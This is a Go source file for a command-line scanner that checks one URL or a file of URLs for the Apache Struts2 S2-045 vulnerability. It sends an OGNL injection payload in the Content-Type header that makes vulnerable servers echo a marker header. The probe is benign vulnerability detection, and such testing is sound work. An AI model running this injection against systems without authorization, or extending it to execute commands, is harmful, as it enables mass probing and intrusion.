//Struts2-045-checker
//检测是否含有Struts2-045漏洞的小东西
//
//作者：labrusca
//邮箱：labrusca@live.com
//许可证：GPLv3
package main

import (
	"fmt"
	"os"
	"io"
	"bufio"
	"strings"
	"net/http"
	"regexp"
)

var complete chan int = make(chan int)

func main() {
	address := "http://www.github.com"
	switch len(os.Args) {
		case 2:
			address = os.Args[1]
			go Has_st(address)
			Done(1,complete)
		case 3:
			if os.Args[1] == "-f" {
				urlfile, ferr := os.Open(os.Args[2])
				if ferr != nil {
					panic(ferr)
				}
				defer urlfile.Close()
				br := bufio.NewReader(urlfile)
				var urlnum int
				for urlnum=0;;urlnum++ {
					//每次读取一行
					surl, urerr := br.ReadString('\n')
					if urerr == io.EOF {
						break
					} else{
						//去掉换行符
						url := strings.Replace(surl, "\n", "", -1)
						go Has_st(url)
					}
				}
				Done(urlnum,complete)
			}
		default:
			fmt.Println("测试http://www.github.com……")
			go Has_st(address)
			Done(1,complete)
			fmt.Println("编译后使用格式如下(Linux)：\n	./S2-045-checker url/-f [urls.txt]")
			os.Exit(0)
	}
}

func Has_st(address string) int{
	re, uerr := regexp.MatchString(`(http[s]?):[//](w{3}\.)?[a-zA-z0-9\/%?:=+.]*\.[a-zA-z0-9\/%?:=+.]{2,6}\b([a-zA-z0-9\/%?:=+.])*`, address)
	if uerr != nil {
		fmt.Println(uerr.Error())
	}
	if re {
		client := &http.Client{}
		req, nerr := http.NewRequest("GET",address, nil)
		if nerr != nil{
			fmt.Println(nerr.Error())
			complete <- 0
			return -1
		}
		req.Header.Add("User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")
		req.Header.Add("infomation","Just for pentest|By Struts2-045-checker.go")
		req.Header.Add("Athor","I'm labrusca.I do not use this 2 hack any site,if happened,not me!")
		req.Header.Add("Content-Type","%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vul','vul')}.multipart/form-data")
		resp, cerr := client.Do(req)
		if cerr != nil{
			fmt.Println(cerr.Error())
			complete <- 0
			return -1
		}
		defer resp.Body.Close()
		//content, err := ioutil.ReadAll(resp.Body)
		//fmt.Println(string(content))
		fmt.Printf("%s %s\n",resp.Header["Vul"],address)
		//fmt.Println(strings.Contains(string(resp.Header["Vul"]), "vul"))
		complete <- 1
		return 1
	} else {
		fmt.Println("URL无效！或许你忘了加 \"http://\" or \"https://\"了。")
	}
	complete <- 0
	return 0

}

func Done(num int,c chan int) {
	for ;num!=0;num-- {
		<- c
	}
}